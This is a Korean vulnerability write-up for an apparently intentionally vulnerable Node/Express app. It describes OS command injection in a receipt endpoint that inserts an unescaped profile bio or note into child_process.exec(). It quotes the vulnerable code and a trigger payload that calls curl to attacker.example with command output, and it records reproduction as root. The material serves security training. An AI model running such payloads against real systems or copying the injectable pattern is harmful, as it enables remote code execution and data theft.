# VULN-010 영수증 생성 OS 커맨드 인젝션

- 대상 스택: node-express
- 심각도: Critical
- 분류: A05:2025 Injection (OS Command Injection)

## 위치

`apps/node-express/src/routes/orders.js`, `POST /api/orders/:id/receipt` — 사용자가 `PUT /api/profile`로 자유롭게 설정 가능한 `bio` 필드(또는 요청 바디의 `note`)를 검증/이스케이프 없이 셸 명령 문자열에 직접 삽입해 `child_process.exec()`로 실행.

```js
const cmd = `echo "영수증 - 주문번호: ${order.toss_order_id} / 수령인: ${user.name} / 메모: ${note}" > "${filePath}"`;
exec(cmd, ...);
```

## 트리거 방법

```
PUT /api/profile
{"bio": "\"; curl http://attacker.example/$(whoami) #"}

POST /api/orders/1/receipt
```

`note`/`bio`에 백틱, `;`, `$()`, `|` 등을 포함시켜 임의 명령 실행. 컨테이너 내 임의 코드 실행(RCE)으로 이어짐.

## 영향

- WAS 프로세스 권한으로 컨테이너 내 임의 명령 실행(RCE) — 시크릿 탈취, 내부망 피벗, 컨테이너 장악.

## 증거 (재현 확인)

2026-09-01, 로컬 재현(`:8090`, `user1`, 소유 주문 #92): `POST /api/node/orders/92/receipt {"note":"$(id)"}`
→ `GET /orders/receipt/receipt_92.txt` 내용에 `메모: uid=0(root) gid=0(root) groups=0(root)` — `note`가
`echo "…" > file` 셸 명령에 들어가 커맨드 치환이 실행됨(컨테이너 root). RCE 확인.

## 정상 서비스 흐름 참고

영수증 파일을 `echo "…" > file` 셸 명령으로 만드는 방식 자체가 인위적이다 — 실제라면 파일 IO/템플릿
엔진을 쓴다. 커맨드 인젝션 sink를 두기 위한 구성이며, java 짝 [[VULN-019-command-injection-receipt-java]]와 동일한 형태다.

## 조치 상태: 미조치 (의도된 취약점)
